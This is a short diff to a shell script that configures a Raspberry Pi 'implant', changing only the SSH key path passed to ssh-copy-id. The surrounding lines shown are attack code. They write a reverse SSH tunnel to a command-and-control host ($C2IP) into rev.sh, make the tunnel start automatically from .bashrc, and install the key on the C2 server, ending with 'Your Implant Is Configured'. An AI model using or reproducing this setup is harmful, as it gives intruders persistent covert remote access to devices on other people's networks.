@@ -65,7 +65,7 @@ echo "ssh -N -R 2222:localhost:22 root@$C2IP" >> rev.sh
 sudo chmod +x rev.sh
 chown pi:pi rev.sh
 echo "sleep 15 && bash /home/pi/rev.sh" >> /home/pi/.bashrc
-ssh-copy-id -i ~/.ssh/id_rsa.pub root@$C2IP
+ssh-copy-id -i /home/pi/.ssh/id_rsa.pub root@$C2IP
 echo "All Is Complete"
 sleep 2
 echo "Your Implant Is Configured"
